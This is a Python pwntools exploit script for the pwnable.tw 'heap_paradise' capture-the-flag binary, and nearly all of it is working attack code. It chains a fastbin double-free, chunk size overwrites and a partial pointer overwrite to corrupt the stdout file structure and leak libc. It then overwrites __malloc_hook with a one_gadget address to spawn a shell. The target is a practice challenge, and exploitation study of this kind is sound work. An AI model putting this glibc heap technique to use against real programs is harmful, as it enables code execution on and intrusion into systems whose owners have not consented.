from pwn import *

slnaf = lambda delim, data: p.sendlineafter(delim, data)
sln = lambda data: p.sendline(data)
saf = lambda delim, data: p.sendafter(delim, data)


elf = context.binary = ELF('heap_paradise')
libc = ELF('libc.so.6')


def malloc(size, data):
    slnaf(b'You Choice:', b'1')
    slnaf(b'Size :', str(size).encode())
    saf(b'Data :', data)
def free(index):
    slnaf(b'You Choice:', b'2')
    slnaf(b'Index :', str(index).encode())
def get_libc(leak):
    leak_len = len(leak)
    for i in range(0, leak_len, 8):
        print(hex(int.from_bytes(leak[i:i+8], byteorder='little')))


#nc chall.pwnable.tw 10308

#p = remote('chall.pwnable.tw', 10308)
p = process()
gdb.attach(p)



STDOUT_OFFSET = 0x3c45dd
malloc(0x68, b'A'*8 + p64(0x71)) # 0
malloc(0x68, b'A'*8 + p64(0x21) + b'A'*0x18 + p64(0x21) + b'A'*0x18 + p64(0x21)) # 1 set up some conditions to free chunk
free(0)
free(1)
free(0)
pause()
malloc(0x68, b'\x10') # 2 overwrite fd pointer
malloc(0x68, b'A') # 3
malloc(0x68, b'A') # 4
malloc(0x68, b'A') # 5




free(5)
free(0)
malloc(0x68, b'A'*8 + p64(0x91)) # 6 overwrite size field to get unsorted bin
free(5) # unsorted bin
guess = 0 # this is to not have to guess when i debug
guess = guess << 12
free(0)
malloc(0x68, b'A'*8 + p64(0x71) + p64(STDOUT_OFFSET + guess)[0:2]) # 7 overwrite size field and fd 


flag = 0xfbad0000
_IO_IS_APPENDING = 0x1000
_IO_CURRENTLY_PUTTING = 0x800
flag |= _IO_IS_APPENDING
flag |= _IO_CURRENTLY_PUTTING
malloc(0x68, b'A') # 8
malloc(0x68, b'\x00'*0x33 + p64(flag) + b'A'*0x18 + b'\x00') # 9 overwrite file structure
p.recvuntil(b'A'*0x18)
leak = p.recv(6)
leak = int.from_bytes(leak, byteorder='little')
print('leak: {}'.format(hex(leak)))
libc.address = leak - 0x3c4600
print('libc: {}'.format(hex(libc.address)))


# write to malloc_hook
ONE_GADGET = 0x4526a
free(5)
free(0)
malloc(0x68, b'A'*0x8 + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 35)) # 10
malloc(0x68, b'A') # 11
malloc(0x68, b'A'*11 + p64(libc.address + ONE_GADGET) + p64(libc.symbols['realloc'] + 16)) # 12


p.recv(1024)
p.sendline(b'1')
p.recv(1024)
p.send(b'20')


p.interactive()